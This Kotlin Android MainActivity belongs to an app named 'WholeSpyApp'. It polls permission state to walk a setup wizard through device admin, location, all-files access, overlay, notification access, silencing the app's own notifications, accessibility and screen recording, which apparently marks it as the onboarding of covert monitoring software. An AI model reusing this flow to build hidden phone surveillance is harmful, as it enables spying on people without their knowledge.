package com.screening.app.featureInstallation

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.runtime.Composable
import androidx.compose.ui.ExperimentalComposeUiApi
import androidx.compose.ui.Modifier
import androidx.core.view.WindowCompat
import androidx.navigation.NavHostController
import com.google.accompanist.permissions.ExperimentalPermissionsApi
import com.screening.app.featureInstallation.presentation.main.WholeSpyApp
import com.screening.app.featureInstallation.presentation.permissions.MainViewModel
import com.screening.app.featureInstallation.presentation.util.AppPermissionUtil
import com.screening.app.utilities.logVerbose
import com.screening.app.utilities.startActivityWithData
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@ExperimentalPermissionsApi
@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    // Inject MainViewModel
    @Inject
    lateinit var mainViewModel: MainViewModel

    // mainThread Handler
    private val mainThreadHandler by lazy { Handler(Looper.getMainLooper()) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // This app draws behind the system bars, so we want to handle fitting system windows
        WindowCompat.setDecorFitsSystemWindows(window, false)
        setContent {
            WholeSpyApp()
        }
        addHandlerCallbacks()
    }

    private fun addHandlerCallbacks() {
        mainThreadHandler.removeCallbacks(mRunnable)
        callRecursiveCallHandler()
    }

    private val mRunnable = Runnable {
        logVerbose("handler callback")
        when (mainViewModel.currentScreen.value) {
            WholeSpyScreen.DeviceActivationScreen -> {

            }
            WholeSpyScreen.DeviceAdminScreen -> {
                // todo: set screen after device admin permission success
            }
            WholeSpyScreen.LocationScreen -> {
                if (AppPermissionUtil.isLocationPermissionGranted(this)) {
                    mainViewModel.setCurrentScreen(WholeSpyScreen.ManagementOfAllFilesScreenScreen)
                    relaunchActivity()
                    return@Runnable
                }
            }
            WholeSpyScreen.ManagementOfAllFilesScreenScreen -> {
                if (AppPermissionUtil.isManagementOfAllFilesPermissionGranted(this)) {
                    mainViewModel.setCurrentScreen(WholeSpyScreen.DisplayOverAppsScreen)
                    relaunchActivity()
                    return@Runnable
                }
            }
            WholeSpyScreen.DisplayOverAppsScreen -> {
                if (AppPermissionUtil.displayOverOtherAppsGranted(this)) {
                    mainViewModel.setCurrentScreen(WholeSpyScreen.NotificationAccessScreen)
                    relaunchActivity()
                    return@Runnable
                }
            }
            WholeSpyScreen.NotificationAccessScreen -> {
                if (AppPermissionUtil.isNotificationAccessEnabled(this)) {
                    mainViewModel.setCurrentScreen(WholeSpyScreen.DisableNotificationAccessScreen)
                    relaunchActivity()
                    return@Runnable
                }
            }
            WholeSpyScreen.DisableNotificationAccessScreen -> {
                if (!AppPermissionUtil.areNotificationsEnabled(this)) {
                    mainViewModel.setCurrentScreen(WholeSpyScreen.AccessibilityScreen)
                    relaunchActivity()
                    return@Runnable
                }
            }
            WholeSpyScreen.AccessibilityScreen -> {
                if (AppPermissionUtil.isAccessibilityEnabled(this)) {
                    mainViewModel.setCurrentScreen(WholeSpyScreen.ScreenRecordScreen)
                    relaunchActivity()
                    return@Runnable
                }
            }
            WholeSpyScreen.ScreenRecordScreen -> {

            }
            WholeSpyScreen.AllCompleteScreen -> {

            }
        }
        callRecursiveCallHandler()
    }

    private fun relaunchActivity(): Unit {
        startActivityWithData<MainActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP
            )
        )
    }

    private fun callRecursiveCallHandler() {
        mainThreadHandler.postDelayed(mRunnable, 500)
    }

    override fun onDestroy() {
        super.onDestroy()
        mainThreadHandler.removeCallbacks(mRunnable)
    }

    @OptIn(ExperimentalComposeUiApi::class)
    @Composable
    fun WholeSpyNavHost(navController: NavHostController, modifier: Modifier = Modifier) {

//        NavHost(
//            navController = navController,
//            startDestination = WholeSpyScreen.DeviceActivationScreen.name,
//            modifier = modifier
//        ) {
//
//            composable(WholeSpyScreen.DeviceActivationScreen.name) {
//                DeviceActivationScreen(
//                    navController = navController,
//                    navigateNext = {
//                        navController.navigate(WholeSpyScreen.DeviceAdminScreen.name)
//                    })
//            }
//
//            composable(WholeSpyScreen.DeviceAdminScreen.name) {
//                DeviceAdminPermissionScreen(navController = navController)
//            }
//
//            composable(WholeSpyScreen.LocationScreen.name) {
//                LocationPermissionScreen(navController = navController)
//            }
//
//        }
    }

    // AppPermissionViewModel
//    @Inject
//    lateinit var permissionsViewModel: PermissionsViewModel
//

//    override fun onCreate(savedInstanceState: Bundle?) {
//        super.onCreate(savedInstanceState)
//
//        // This app draws behind the system bars, so we want to handle fitting system windows
//        WindowCompat.setDecorFitsSystemWindows(window, false)
//        setContent {
//            TOSTheme {
////                DestinationsNavHost(navGraph = NavGraphs.root)
//                Surface {
//                    val navController = rememberNavController()
//                    NavHost(
//                        navController = navController,
//                        startDestination = Screen.DeviceActivationScreen.route
//                    ) {
//                        composable(route = Screen.DeviceActivationScreen.route) {
//                            DeviceActivationScreen(navController = navController)
//                        }
//                        composable(route = Screen.DeviceAdminScreen.route) {
//                            DeviceAdminPermissionScreen(navController = navController)
//                        }
//                    }
//                }
//            }
//        }
//
//        collectLatestLifeCycleFlow(permissionsViewModel.screenState) { permissionState ->
//            logVerbose("permission state collect = ${permissionState.javaClass.simpleName}")
//            when (permissionState) {
//
//            }
//        }
//        addHandlerCallbacks()
//    }
}
